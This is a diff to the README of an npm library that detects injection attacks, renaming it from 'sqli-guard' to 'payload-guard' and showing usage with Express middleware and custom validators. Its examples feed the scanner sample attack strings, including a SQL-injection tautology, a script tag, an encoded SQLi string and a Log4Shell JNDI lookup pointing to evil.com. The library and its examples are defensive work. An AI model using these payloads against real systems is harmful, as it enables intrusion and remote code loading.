@@ -1,29 +1,29 @@
 <div align="center">
 
-<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/banner.svg" alt="sqli-guard: catch injection attacks before they reach your app" width="100%">
+<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/banner.svg" alt="payload-guard: catch injection attacks before they reach your app" width="100%">
 
-[![npm version](https://img.shields.io/npm/v/sqli-guard.svg?style=flat-square&color=3fb950)](https://www.npmjs.com/package/sqli-guard)
-[![downloads](https://img.shields.io/npm/dm/sqli-guard.svg?style=flat-square&color=58a6ff)](https://www.npmjs.com/package/sqli-guard)
+[![npm version](https://img.shields.io/npm/v/payload-guard.svg?style=flat-square&color=3fb950)](https://www.npmjs.com/package/payload-guard)
+[![downloads](https://img.shields.io/npm/dm/payload-guard.svg?style=flat-square&color=58a6ff)](https://www.npmjs.com/package/payload-guard)
 [![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg?style=flat-square)](./package.json)
 [![types](https://img.shields.io/badge/types-included-3178c6.svg?style=flat-square)](./index.d.ts)
-[![node](https://img.shields.io/node/v/sqli-guard.svg?style=flat-square)](./package.json)
-[![license](https://img.shields.io/npm/l/sqli-guard.svg?style=flat-square)](./LICENSE)
+[![node](https://img.shields.io/node/v/payload-guard.svg?style=flat-square)](./package.json)
+[![license](https://img.shields.io/npm/l/payload-guard.svg?style=flat-square)](./LICENSE)
 
 **One call. Fourteen attack families. Zero dependencies.**
 
 </div>
 
 ```js
-const guard = require('sqli-guard');
+const guard = require('payload-guard');
 
 guard.hasSql("' OR 1=1 --");               // true
 guard.hasSql('${jndi:ldap://evil.com/a}'); // true  (Log4Shell)
 guard.hasSql('Hello, my name is Ana');     // false
 ```
 
-<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/demo.svg" alt="Terminal demo: sqli-guard blocking SQL injection, XSS, Log4Shell, SSRF and prototype pollution while allowing normal text" width="100%">
+<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/demo.svg" alt="Terminal demo: payload-guard blocking SQL injection, XSS, Log4Shell, SSRF and prototype pollution while allowing normal text" width="100%">
 
-## Why sqli-guard?
+## Why payload-guard?
 
 - 🛡️ **14 attack families**: SQLi, XSS, command injection, path traversal, NoSQL, LDAP, SSTI, CRLF, **SSRF, XXE, prototype pollution, Log4Shell, XPath, Unicode tricks**.
 - 🕵️ **Sees through evasion**: URL-encoded, double-encoded, HTML entities, `UN/**/ION` comments and fullwidth Unicode are decoded before scanning.
@@ -36,22 +36,22 @@ guard.hasSql('Hello, my name is Ana');     // false
 ## Install
 
 ```bash
-npm install sqli-guard
+npm install payload-guard
 ```
 
 ```js
 // Node (CommonJS)
-const sqliGuard = require('sqli-guard');
+const payloadGuard = require('payload-guard');
 
 // ESM / TypeScript / React, Vue, Angular
-import sqliGuard from 'sqli-guard';
+import payloadGuard from 'payload-guard';
 ```
 
 ## Protect an Express API in one line
 
 ```js
 const express = require('express');
-const guard = require('sqli-guard');
+const guard = require('payload-guard');
 
 const app = express();
 app.use(express.json());
@@ -66,16 +66,16 @@ Options: `sources`, `status`, and `onThreat(req, res, threats)` for custom respo
 
 ## What it catches
 
-<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/coverage.svg" alt="The 14 attack families detected by sqli-guard" width="100%">
+<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/coverage.svg" alt="The 14 attack families detected by payload-guard" width="100%">
 
-## Attackers encode. sqli-guard decodes.
+## Attackers encode. payload-guard decodes.
 
 Regexes on raw input are trivially bypassed. Every value is also scanned after
 URL decoding (up to 3 rounds), HTML-entity decoding, `\u`/`\x` unescaping, NFKC
 Unicode normalization and SQL-comment stripping. Threats visible only after
 decoding are flagged with `evasion: true`.
 
-<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/evasion.svg" alt="Encoded payloads that bypass naive matching but are caught by sqli-guard" width="100%">
+<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/evasion.svg" alt="Encoded payloads that bypass naive matching but are caught by payload-guard" width="100%">
 
 ```js
 guard.scan('%27%20OR%201%3D1--').threats[0];
@@ -96,17 +96,17 @@ Object **keys** are scanned too, so `{"__proto__": ...}` and `{"$where": ...}` p
 `hasSql(value)` returns `true` if it detects ANY threat, otherwise `false`.
 
 ```js
-sqliGuard.hasSql('SELECT * FROM users');       // true
-sqliGuard.hasSql("' OR 1=1 --");               // true
-sqliGuard.hasSql('<script>alert(1)</script>'); // true
-sqliGuard.hasSql('Your name');                 // false
-sqliGuard.hasSql(null);                         // false  (empty = safe)
+payloadGuard.hasSql('SELECT * FROM users');       // true
+payloadGuard.hasSql("' OR 1=1 --");               // true
+payloadGuard.hasSql('<script>alert(1)</script>'); // true
+payloadGuard.hasSql('Your name');                 // false
+payloadGuard.hasSql(null);                         // false  (empty = safe)
 ```
 
 `scan(value)` returns the list of threats found.
 
 ```js
-sqliGuard.scan("' OR 1=1 --");
+payloadGuard.scan("' OR 1=1 --");
 // {
 //   safe: false,
 //   value: "' OR 1=1 --",
@@ -116,7 +116,7 @@ sqliGuard.scan("' OR 1=1 --");
 //   ]
 // }
 
-sqliGuard.isSafe('Your name'); // true
+payloadGuard.isSafe('Your name'); // true
 ```
 
 ## Language
@@ -124,7 +124,7 @@ sqliGuard.isSafe('Your name'); // true
 Messages default to English. Pass `lang: 'es'` for Spanish.
 
 ```js
-const { createScanner } = sqliGuard;
+const { createScanner } = payloadGuard;
 
 const es = createScanner({ lang: 'es' });
 es.scan('<script>x</script>').threats[0].message;
@@ -137,7 +137,7 @@ es.scan('<script>x</script>').threats[0].message;
 Add your own patterns with `addValidator(name, spec)`.
 
 ```js
-const scanner = sqliGuard.createScanner();
+const scanner = payloadGuard.createScanner();
 
 // 1) With a RegExp
 scanner.addValidator('no-emoji', /\p{Emoji}/u);
@@ -192,10 +192,10 @@ scanner.addValidator('no-emoji', {
 
 ```js
 // SQL injection only, ignore everything else
-const sqlOnly = sqliGuard.createScanner({ categories: ['sql-injection'] });
+const sqlOnly = payloadGuard.createScanner({ categories: ['sql-injection'] });
 
 // Only high-severity threats
-const strict = sqliGuard.createScanner({ minSeverity: 'high' });
+const strict = payloadGuard.createScanner({ minSeverity: 'high' });
 ```
 
 Available categories: `sql-injection`, `xss`, `command-injection`,
